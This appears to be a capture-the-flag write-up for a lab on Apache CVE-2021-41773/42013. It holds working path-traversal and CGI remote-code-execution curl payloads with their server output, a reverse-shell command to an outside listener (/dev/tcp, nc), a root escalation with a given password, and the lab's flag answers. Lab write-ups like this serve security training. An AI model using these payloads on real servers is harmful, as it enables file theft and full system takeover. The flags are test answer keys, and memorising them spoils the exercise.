> # CVE-2021-41773/42013

# Summary
<!-- TOC -->

- [Summary](#summary)
    - [Task 1 - A Bit of Background...](#task-1---a-bit-of-background)
    - [Task 2 - What is Path Traversal anyways?](#task-2---what-is-path-traversal-anyways)
    - [Task 3 - Ok, Ok; Gib Hax!](#task-3---ok-ok-gib-hax)
    - [Task 4 - Practical Exam](#task-4---practical-exam)

<!-- /TOC -->

## Task 1 - A Bit of Background...
1. What version of Apache httpd was initially vulnerable to this CVE?<br>
    > On the 5th of October 2021, a CVE detailing a path traversal attack on Apache HTTP Server v2.4.49 was released. 

    **Answer:** 2.4.49

1. This vulnerability requires an unusual misconfiguration for it to be exploitable (Yea/Nay)<br>   
    > This is not the default configuration and should thus render this exploit useless against a large percentage of the Apache hosts

    **Answer:** Yea

## Task 2 - What is Path Traversal anyways?
1. A path traversal exploit will (choose the best answer):<br>
    C. Allow arbitrary files to be exposed by the server.
    **Answer:** C

1. URL-encode the . symbol<br>
    **Answer:** %2E

1. What does this URL fragment decode to:  %%32%65 ?<br>    
    **Answer:** %2E

## Task 3 - Ok, Ok; Gib Hax!
1. What module needs to be enabled in order to get remote code execution?<br>
    > we simply need to activate the CGI module in addition to the access permissions
    
    **Answer:** mod_cgi

## Task 4 - Practical Exam
1. What is the flag on port 8080?<br>
    The flag is in / folder
    Payload: `$ curl -v 'http://10.10.82.86:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/flag%2etxt'`
    ```
    *   Trying 10.10.82.86:8080...
    * Connected to 10.10.82.86 (10.10.82.86) port 8080 (#0)
    > GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/flag%2etxt HTTP/1.1
    > Host: 10.10.82.86:8080
    > User-Agent: curl/7.84.0
    > Accept: */*
    > 
    * Mark bundle as not supporting multiuse
    < HTTP/1.1 200 OK
    < Date: Sun, 25 Jun 2023 05:07:25 GMT
    < Server: Apache/2.4.49 (Unix)
    < Last-Modified: Mon, 11 Oct 2021 09:16:12 GMT
    < ETag: "1d-5ce102e25be36"
    < Accept-Ranges: bytes
    < Content-Length: 29
    < Content-Type: text/plain
    < 
    * Connection #0 to host 10.10.82.86 left intact
    THM{724V3R51N6_P4TH5_F02_FUN}
    ```
    **Answer:** THM{724V3R51N6_P4TH5_F02_FUN}

1. What is the flag on port 8081?<br>
    Payload: `curl -v 'http://10.10.82.86:8081/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash' -d 'echo Content-Type: text/plain; echo; cat /flag.txt' -H "Content-Type: text/plain"`

    ```
       Trying 10.10.82.86:8081...
    * Connected to 10.10.82.86 (10.10.82.86) port 8081 (#0)
    > POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash HTTP/1.1
    > Host: 10.10.82.86:8081
    > User-Agent: curl/7.84.0
    > Accept: */*
    > Content-Type: text/plain
    > Content-Length: 50
    > 
    * Mark bundle as not supporting multiuse
    < HTTP/1.1 200 OK
    < Date: Sun, 25 Jun 2023 05:29:06 GMT
    < Server: Apache/2.4.49 (Unix)
    < Transfer-Encoding: chunked
    < Content-Type: text/plain
    < 
    * Connection #0 to host 10.10.82.86 left intact
    THM{2C3_F20M_C61}
    ```
    **Answer:** THM{2C3_F20M_C61}

1. What is the flag on port 8082?<br>
    Payload: `curl -v 'http://10.10.82.86:8082/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/flag.txt'`
    ```
    *   Trying 10.10.82.86:8082...
    * Connected to 10.10.82.86 (10.10.82.86) port 8082 (#0)
    > GET /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/flag.txt HTTP/1.1
    > Host: 10.10.82.86:8082
    > User-Agent: curl/7.84.0
    > Accept: */*
    > 
    * Mark bundle as not supporting multiuse
    < HTTP/1.1 200 OK
    < Date: Sun, 25 Jun 2023 05:40:31 GMT
    < Server: Apache/2.4.50 (Unix)
    < Last-Modified: Mon, 11 Oct 2021 09:16:12 GMT
    < ETag: "18-5ce102e26103d"
    < Accept-Ranges: bytes
    < Content-Length: 24
    < Content-Type: text/plain
    < 
    * Connection #0 to host 10.10.82.86 left intact
    THM{D0UBL3_3NC0D1N6_F7W}
    ```
    **Answer:** THM{D0UBL3_3NC0D1N6_F7W}

1. What is the flag on port 8083?<br>
    Payload: `curl -v 'http://10.10.82.86:8083/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/bash' -d 'echo Content-Type: text/plain; echo; cat /flag.txt' -H "Content-Type: text/plain"`
    ```
    *   Trying 10.10.82.86:8083...
    * Connected to 10.10.82.86 (10.10.82.86) port 8083 (#0)
    > POST /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/bash HTTP/1.1
    > Host: 10.10.82.86:8083
    > User-Agent: curl/7.84.0
    > Accept: */*
    > Content-Type: text/plain
    > Content-Length: 50
    > 
    * Mark bundle as not supporting multiuse
    < HTTP/1.1 200 OK
    < Date: Sun, 25 Jun 2023 05:41:29 GMT
    < Server: Apache/2.4.50 (Unix)
    < Transfer-Encoding: chunked
    < Content-Type: text/plain
    < 
    * Connection #0 to host 10.10.82.86 left intact
    THM{F1L732_8YP455_2C3}
    ```
    **Answer:** THM{F1L732_8YP455_2C3}

1. What user is the Apache server running as?<br>
    We will create a reverse shell to RCE on Apache. First, create a bash file on the server with payload
    `curl -v 'http://10.10.162.19:8083/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/bash' -d 'echo Content-Type: text/plain; echo; echo "bash -i >& /dev/tcp/10.8.61.205/4444 0>&1" > /tmp/vuln.sh' -H "Content-Type: text/plain"`
    Check whether the file is created.<br>
    `curl -v 'http://10.10.162.19:8083/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/bash' -d 'echo Content-Type: text/plain; echo; cat /tmp/vuln.sh' -H "Content-Type: text/plain"`
    Run the bash file to get revershell.
    `curl -v 'http://10.10.162.19:8083/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/bash' -d 'echo Content-Type: text/plain; echo; bash /tmp/vuln.sh' -H "Content-Type: text/plain"`

    ```
    $ nc -lvnp 4444
    listening on [any] 4444 ...
    connect to [10.8.61.205] from (UNKNOWN) [10.10.162.19] 44168
    bash: cannot set terminal process group (1): Inappropriate ioctl for device
    bash: no job control in this shell
    daemon@18c7613b3859:/bin$ id
    id
    uid=1(daemon) gid=1(daemon) groups=1(daemon)
    ```
    We got reverse shell from Apache server, run `id` to get current user name.<br>
    **Answer:** daemon

1. Find the root flag on the machine on port 8083?<br>
    The hint give the password of root is ApacheCVE
    ```
    daemon@18c7613b3859:/bin$ su root
    su root
    Password: ApacheCVE
    id
    uid=0(root) gid=0(root) groups=0(root)
    ls /root
    root.txt
    cat /root/root.txt
    THM{P21V_35C_F20M_4P4CH3_15_FUN}
    ```
    **Answer:** THM{P21V_35C_F20M_4P4CH3_15_FUN}

